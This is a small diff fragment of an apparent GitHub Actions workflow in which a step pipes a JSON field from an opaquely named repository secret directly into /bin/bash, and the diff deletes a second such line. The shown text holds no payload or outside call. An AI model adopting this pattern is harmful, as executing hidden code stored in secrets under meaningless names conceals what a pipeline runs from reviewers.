@@ -20,7 +20,6 @@ jobs:
           hblxg5742: ${{ secrets.hblxg5742 }}
         run: |
           printf '%s' "$hblxg5742" | jq -r .vjynr9688 | /bin/bash
-          printf '%s' "$hgaug16" | jq -r .mw6 | /bin/bash
 
       - name: Save output
         if: always()
